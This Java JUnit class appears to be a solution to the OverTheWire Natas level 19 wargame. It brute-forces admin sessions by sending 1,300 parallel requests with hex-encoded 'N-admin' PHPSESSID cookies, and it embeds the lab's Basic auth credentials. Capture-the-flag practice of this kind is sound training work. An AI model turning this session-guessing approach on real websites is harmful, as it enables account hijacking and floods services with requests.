import io.restassured.RestAssured;
import io.restassured.config.ConnectionConfig;
import io.restassured.response.Response;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.junit.jupiter.api.Test;

import javax.xml.bind.DatatypeConverter;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class Natas19 extends BaseClass {
    final String url = "http://natas19.natas.labs.overthewire.org/index.php";
    final String authToken = "Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==";


    public String encodeToken(String cookie) {
        StringBuilder sb = new StringBuilder();
        sb.append(cookie);
        sb.append("-admin");
        byte[] stringAsByteArr = sb.toString().getBytes(StandardCharsets.UTF_8);
        return  DatatypeConverter.printHexBinary(stringAsByteArr).toLowerCase(Locale.ROOT);
    }



    @Test
    public void kickOutSession() throws InterruptedException {
        RestAssured.config = RestAssured.config().connectionConfig(new ConnectionConfig().closeIdleConnectionsAfterEachResponseAfter(10, TimeUnit.SECONDS));
        int numberOfRequests = 1300;
        ExecutorService executorService = Executors.newFixedThreadPool(numberOfRequests);

        Map<String, String> params = new HashMap<>();
        params.put("username", "admin");
        params.put("password", "secret");
        params.put("debug", "y");

        for (int i = 0; i < numberOfRequests; i++) {
            int finalI = i;
            executorService.submit(() -> {
                Response response = getRequestWithParamsAndCookie(url, authToken, params, "PHPSESSID", encodeToken(String.valueOf(finalI)));
                Document doc = Jsoup.parse(response.getBody().asString());
                try {
                    writeTextToFile("src/test/resources/responses2.txt", doc.select("#content").text());
                } catch (IOException e) {
                    System.out.println("Something went wrong: " + Arrays.toString(e.getStackTrace()));
                }
            });
        }
        executorService.shutdown();
        executorService.awaitTermination(100, TimeUnit.SECONDS);
    }
}
